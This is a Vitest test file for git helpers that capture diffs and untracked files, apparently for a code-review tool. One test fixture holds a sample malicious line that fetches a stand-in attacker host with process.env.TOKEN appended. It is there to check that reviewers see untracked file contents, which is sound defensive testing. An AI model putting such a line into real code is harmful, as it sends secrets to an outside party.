import { describe, expect, it, vi } from "vitest";
import { ServerBusyError } from "../src/exec.js";
import type { Exec } from "../src/exec.js";
import { MAX_UNTRACKED_FILE_BYTES, captureChange, isGitRepo, worktreeDirty } from "../src/git.js";

const mockExec = (
  calls: Array<{
    args: string[];
    result: { stdout: string; stderr: string; exitCode: number | null };
  }>,
) => {
  const fn = vi.fn<Exec>();
  for (const _call of calls) {
    fn.mockImplementation(async (binary: string, args: string[], _opts?: { cwd?: string }) => {
      const match = calls.find((c) => JSON.stringify(c.args) === JSON.stringify(args));
      if (match) return match.result;
      throw new Error(`unexpected call: ${binary} ${args.join(" ")}`);
    });
  }
  return fn;
};

describe("isGitRepo", () => {
  it("returns true when git rev-parse reports inside a work tree", async () => {
    const exec = mockExec([
      {
        args: ["rev-parse", "--is-inside-work-tree"],
        result: { stdout: "true\n", stderr: "", exitCode: 0 },
      },
    ]);

    const result = await isGitRepo(exec, "/repo");

    expect(result).toBe(true);
    expect(exec).toHaveBeenCalledWith("git", ["rev-parse", "--is-inside-work-tree"], {
      cwd: "/repo",
    });
  });

  it("returns false when git rev-parse exits non-zero", async () => {
    const exec = mockExec([
      {
        args: ["rev-parse", "--is-inside-work-tree"],
        result: { stdout: "", stderr: "x", exitCode: 128 },
      },
    ]);

    const result = await isGitRepo(exec, "/not-a-repo");

    expect(result).toBe(false);
    expect(exec).toHaveBeenCalledWith("git", ["rev-parse", "--is-inside-work-tree"], {
      cwd: "/not-a-repo",
    });
  });

  it("propagates thrown errors instead of resolving false", async () => {
    const exec = vi.fn<Exec>().mockRejectedValue(new ServerBusyError());

    await expect(isGitRepo(exec, "/repo")).rejects.toBeInstanceOf(ServerBusyError);
  });

  it("returns false for a completed non-true result", async () => {
    const exec = mockExec([
      {
        args: ["rev-parse", "--is-inside-work-tree"],
        result: { stdout: "false\n", stderr: "", exitCode: 0 },
      },
    ]);

    const result = await isGitRepo(exec, "/repo");

    expect(result).toBe(false);
    expect(exec).toHaveBeenCalledWith("git", ["rev-parse", "--is-inside-work-tree"], {
      cwd: "/repo",
    });
  });
});

describe("worktreeDirty", () => {
  it("returns true when status --porcelain produces output", async () => {
    const exec = mockExec([
      {
        args: ["status", "--porcelain"],
        result: { stdout: " M file.txt\n", stderr: "", exitCode: 0 },
      },
    ]);

    const result = await worktreeDirty(exec, "/repo");

    expect(result).toBe(true);
    expect(exec).toHaveBeenCalledWith("git", ["status", "--porcelain"], { cwd: "/repo" });
  });

  it("returns false when status --porcelain is empty", async () => {
    const exec = mockExec([
      {
        args: ["status", "--porcelain"],
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
    ]);

    const result = await worktreeDirty(exec, "/repo");

    expect(result).toBe(false);
    expect(exec).toHaveBeenCalledWith("git", ["status", "--porcelain"], { cwd: "/repo" });
  });
});

describe("captureChange", () => {
  it("surfaces an unreadable untracked file as a placeholder, not a silent empty body", async () => {
    // git exits >1 when it cannot read the file (e.g. permission denied); an
    // empty body would read to the reviewer as "nothing to see", hiding content.
    const exec = mockExec([
      { args: ["diff", "--stat", "HEAD"], result: { stdout: "", stderr: "", exitCode: 0 } },
      { args: ["diff", "HEAD"], result: { stdout: "", stderr: "", exitCode: 0 } },
      {
        args: ["ls-files", "--others", "--exclude-standard"],
        result: { stdout: "locked.bin\n", stderr: "", exitCode: 0 },
      },
      {
        args: ["--no-pager", "diff", "--no-index", "--", "/dev/null", "locked.bin"],
        result: { stdout: "", stderr: "fatal: cannot read", exitCode: 128 },
      },
    ]);

    const result = await captureChange(exec, "/repo");

    expect(result.untracked).toHaveLength(1);
    expect(result.untracked[0].path).toBe("locked.bin");
    expect(result.untracked[0].truncated).toBe(true);
    expect(result.untracked[0].content).toMatch(/unreadable/i);
  });

  it("parses stat, diff, and untracked with blank lines dropped", async () => {
    const exec = mockExec([
      {
        args: ["diff", "--stat", "HEAD"],
        result: { stdout: " file.txt | 5 ++++\n\n", stderr: "", exitCode: 0 },
      },
      {
        args: ["diff", "HEAD"],
        result: { stdout: "@@ -1,3 +1,5 @@\n+new line\n", stderr: "", exitCode: 0 },
      },
      {
        args: ["ls-files", "--others", "--exclude-standard"],
        result: { stdout: "new-file.txt\n\nanother.txt\n", stderr: "", exitCode: 0 },
      },
      {
        args: ["--no-pager", "diff", "--no-index", "--", "/dev/null", "new-file.txt"],
        result: { stdout: "+first body\n", stderr: "", exitCode: 1 },
      },
      {
        args: ["--no-pager", "diff", "--no-index", "--", "/dev/null", "another.txt"],
        result: { stdout: "+second body\n", stderr: "", exitCode: 1 },
      },
    ]);

    const result = await captureChange(exec, "/repo");

    expect(result.stat).toBe(" file.txt | 5 ++++\n\n");
    expect(result.diff).toBe("@@ -1,3 +1,5 @@\n+new line\n");
    expect(result.untrackedTruncated).toBe(false);
    expect(result.untracked).toEqual([
      { path: "new-file.txt", content: "+first body\n", truncated: false },
      { path: "another.txt", content: "+second body\n", truncated: false },
    ]);
    expect(exec).toHaveBeenNthCalledWith(1, "git", ["diff", "--stat", "HEAD"], { cwd: "/repo" });
    expect(exec).toHaveBeenNthCalledWith(2, "git", ["diff", "HEAD"], { cwd: "/repo" });
    expect(exec).toHaveBeenNthCalledWith(3, "git", ["ls-files", "--others", "--exclude-standard"], {
      cwd: "/repo",
    });
  });

  it("returns the CONTENTS of an untracked file, not just its name", async () => {
    const malicious = "+const exfil = () => fetch('http://evil.example/' + process.env.TOKEN);\n";
    const exec = mockExec([
      {
        args: ["diff", "--stat", "HEAD"],
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: ["diff", "HEAD"],
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: ["ls-files", "--others", "--exclude-standard"],
        result: { stdout: "payload.ts\n", stderr: "", exitCode: 0 },
      },
      {
        args: ["--no-pager", "diff", "--no-index", "--", "/dev/null", "payload.ts"],
        result: { stdout: malicious, stderr: "", exitCode: 1 },
      },
    ]);

    const result = await captureChange(exec, "/repo");

    expect(result.untracked).toHaveLength(1);
    expect(result.untracked[0].path).toBe("payload.ts");
    expect(result.untracked[0].content).toContain("exfil");
    expect(result.untracked[0].content).toContain("process.env.TOKEN");
    expect(result.untracked[0].truncated).toBe(false);
    expect(exec).toHaveBeenCalledWith(
      "git",
      ["--no-pager", "diff", "--no-index", "--", "/dev/null", "payload.ts"],
      { cwd: "/repo" },
    );
  });

  it("truncates an untracked file that exceeds the per-file byte cap", async () => {
    const huge = "x".repeat(MAX_UNTRACKED_FILE_BYTES + 500);
    const exec = mockExec([
      {
        args: ["diff", "--stat", "HEAD"],
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: ["diff", "HEAD"],
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: ["ls-files", "--others", "--exclude-standard"],
        result: { stdout: "big.bin\n", stderr: "", exitCode: 0 },
      },
      {
        args: ["--no-pager", "diff", "--no-index", "--", "/dev/null", "big.bin"],
        result: { stdout: huge, stderr: "", exitCode: 1 },
      },
    ]);

    const result = await captureChange(exec, "/repo");

    expect(result.untracked[0].truncated).toBe(true);
    expect(Buffer.byteLength(result.untracked[0].content, "utf8")).toBe(MAX_UNTRACKED_FILE_BYTES);
  });

  it("propagates when the diff call throws", async () => {
    const exec = vi.fn<Exec>().mockRejectedValue(new ServerBusyError());

    await expect(captureChange(exec, "/repo")).rejects.toBeInstanceOf(ServerBusyError);
  });

  it("propagates when a later git call rejects", async () => {
    const exec = vi.fn<Exec>();
    exec.mockImplementationOnce(async () => ({
      stdout: " file.txt | 1 +\n",
      stderr: "",
      exitCode: 0,
    }));
    exec.mockImplementationOnce(async () => {
      throw new ServerBusyError();
    });
    exec.mockImplementationOnce(async () => ({
      stdout: "",
      stderr: "",
      exitCode: 0,
    }));

    await expect(captureChange(exec, "/repo")).rejects.toBeInstanceOf(ServerBusyError);
  });
});
